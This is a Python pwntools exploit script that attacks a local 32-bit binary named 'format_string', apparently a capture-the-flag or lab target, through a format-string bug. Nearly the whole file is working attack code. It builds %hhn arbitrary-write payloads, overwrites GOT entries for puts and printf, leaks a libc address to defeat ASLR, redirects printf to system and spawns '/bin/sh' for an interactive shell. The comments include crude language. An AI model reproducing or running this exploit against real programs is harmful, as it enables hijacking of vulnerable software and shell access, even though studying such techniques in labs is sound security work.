#!/usr/bin/env python
# -*- coding: utf-8 -*-
# pasteBin - Jordan Brown 2016
# exploit format string with ASLR and NX
# 
# General approach is to abstract the shit out of everything
# and make each function as robust as possible
# 
# once done, this removes the hassel of being a finikey bitch


from pwn import *
from sys import *

with open('payload', 'w') as f:
	f.write('')

buff = "A"
offset_to_string = 5


def send(conn, line):
	"""
		send a line to the program
		but also save it to 'payload'
		so we can recreate later
	"""
	conn.sendline(line)
	with open('payload', 'a') as f:
		line += '\x0a'
		f.write(line)

def set_cur_val(a):
	"""
		~~~ IMPORTANT ~~
		the %n operator write the number of bytes written so far 
		%hhn writes one byte (0x00 -> 0xff)

		This function returns the minimal payload required
		to print out enough whitespace to get the number
		of characters printed to the desired value

		To do this it uses a global counter called 'current_val'
		which represents the number of bytes written so far
	"""
	global current_val

	# Work out how much whitespace we need to overflow
	# the least significant byte to 0x00
	gets_to_zero = 256 - current_val # add this to get to 0x00

	# then add the amount required to get to the desired value
	gets_to_destination = gets_to_zero + a 

	# since it's 1 byte it doesn't make sense to use more than 256 characters
	inc = gets_to_destination%256 # adding > 256 is the same as adding 0 so mod 256

	# update the number of bytes printed
	current_val = a
	# if we don't have to increment then just return an empty string
	if inc == 0: # %0c is the same as %1c so if it's 0 difference then just print nothing
		return "" 

	second_inc = 0
	while "7" in str(inc) or "3" in str(inc):
		inc -= 1
		second_inc += 1
	if second_inc == 0:
		return "%1$" + str(inc) + "c" 

	return "%1$" + str(inc) + "c" + "%1$" + str(second_inc) + "c" 

def payload_write_data_to_addr(data, addr):
	"""
		Writes 4 bytes of your choice to the address given
		This is the back bone of this exploit

		Finikey as fuck
	"""
	global current_val

	# remove '0x' and convert to little endian
	# 0xaabbccdd -> ddccbbaa 
	# 0x12345678 -> 87654321
	hexStr = hex(data)[2:][::-1] 


	# ddccbbaa -> [dd, cc, bb, aa]
	# 87654321 -> [78, 56, 34, 12]
	byteList = [ hexStr[i:i+2][::-1] for i in xrange(0, len(hexStr), 2) ]

	# convert from hex strings to data
	bytes = [int(x,16) for x in byteList]

	# need to offset the payload by 1 byte
	# took me 3 fucking hours to work that out
	payload = buff

	# we are going to write to the 4 bytes of 
	# our address. E.G if we got data:0xa1b2c3d4 addr: 0xffb7aa00
	# we would write the following bytes to the addresses below:
	# 0xffb7aa00 : d4
	# 0xffb7aa01 : c3
	# 0xffb7aa02 : b2
	# 0xffb7aa03 : a1
	# 
	# 0xffb7aa00  == d4c3b2a1
	# (int) * 0xffb7aa00  == 0xa1b2c3d4
	# add our addresses to the start of the format string
	off = offset_to_string 
	for pos in range(len(bytes)):
		while "7" in str(off) or "3" in str(off):
			payload += "AAAA" # dummy stuff in the spaces with 3's and 7's
			off += 1
		off += 1
		payload += p32(addr + pos) 

	# this is the offset of the first address in our string
	# it also took a while to work out

	# set the number of bytes written to be the current length of
	# our payload
	current_val = len(payload)

	# this takes the a'th byte index of the address you want to 
	# write to, and writes the number of bytes printed there
	write_to_byte = lambda a: "%{0}$hhn".format(a)

	# for each byte, set the least significant byte of the
	# value for the number of bytes written
	# and write that to the address
	off = offset_to_string
	for pos, byte in enumerate(bytes):
		while "7" in str(off) or "3" in str(off):
			off += 1
		payload += set_cur_val(byte) + write_to_byte(off)
		off += 1

	# return the payload string to use
	return payload

def payload_read_addr(addr):
	"""
		Leak the value at address (addr)
		put it in a print statement in between ':::'
		to make finding it easier
	"""

	# necessary offset
	payload = buff

	# just writing the address
	payload += p32(addr)

	# this is the offset of the first address in our string
	current_val = len(payload)

	payload += ":::%{0}$ls:::".format(offset_to_string)

	return payload

def deref(addr):
	"""
		Dereference a pointer
	"""

	# get the value of the pointer you want to dereference
	payload = payload_read_addr(addr)
	send(conn, payload)

	# used to identify the value at the address
	print conn.recvuntil(':::'),
	memoryString = conn.recvuntil(':::')[:-3] # grab the data
	conn.recv()
	buff = []
	for char in memoryString[::-1]:
		h = hex(ord(char))[2:]
		if len(h) == 1:
			h = '0' + h
		buff.append(h)
	return buff[-4:]


def stack_leak(offset):
	"""
		Leak an offset value from the stack
	"""
	payload = "%" + str(offset) + "$x"
	send(conn, "AA" + payload + "BB")

	print conn.recvuntil('AA'),
	memoryString = conn.recvuntil('BB')[:-2] 
	conn.recv()
	return memoryString

# working out the offsets
# def stack_run(num):
# 	return "%5$hhx."*num


# %1$*2$x --> first arg, second arg spacings
def stack_run(num):
	start = 1
	return ''.join(["%x.".format(x + start) for x in range(num*2)])# if not "7" in str(x + start) and "3" not in str(x + start)])

# do_the_format = 0x804851b

system_test = 0xf7e337f0
libc_start_test = 0xf7e11180

system_offset_into_libc = system_test - libc_start_test

odump = subprocess.check_output("objdump -d ./format_string | grep '<main>:'", shell=True)
main =  int("0x" + odump[:odump.index(' ')], 16) + 0

odump = subprocess.check_output("objdump -d ./format_string | grep '<do_the_format>:'", shell=True)
do_the_format =  int("0x" + odump[:odump.index(' ')], 16) + 53 # found by guessing, works :)

odump = subprocess.check_output("objdump -R ./format_string | grep puts", shell=True)
puts_plt = int("0x" + odump[:odump.index(' ')], 16)

odump = subprocess.check_output("objdump -R ./format_string | grep libc_start", shell=True)
libc_start_main_plt = int("0x" + odump[:odump.index(' ')], 16)

odump = subprocess.check_output("objdump -R ./format_string | grep printf", shell=True)
printf_plt = int("0x" + odump[:odump.index(' ')], 16)

# run the process
conn = process('./format_string')
welcome = conn.recvuntil('format string>')
print welcome,

# this is the number of bytes written
# this is manipulated to write arbitrary data using %n
current_val = 0
# conn.close()
# Set the puts entry in the GOT to be somewhere in our main funciton
# this puts us in a loop so we can do more formatstrings
payload = payload_write_data_to_addr(do_the_format, puts_plt)
# payload = stack_run(10)
send(conn, payload)
print conn.recv(),
# print conn.recv(),
# print conn.recv(),

send(conn, "hello")
print conn.recv(),
send(conn, "hello")
print conn.recv(),

libc_start = deref(libc_start_main_plt)

system = int("0x" + ''.join(libc_start),16) + system_offset_into_libc

payload = payload_write_data_to_addr(system, printf_plt)
send(conn, payload)
# print conn.recv(),
send(conn, "/bin/sh")

conn.interactive()

# # set puts to be the return spot in the main function
# payload = payload_write_data_to_addr(main_end, puts)
# send(conn, payload)
# print conn.recv()

# conn.close()



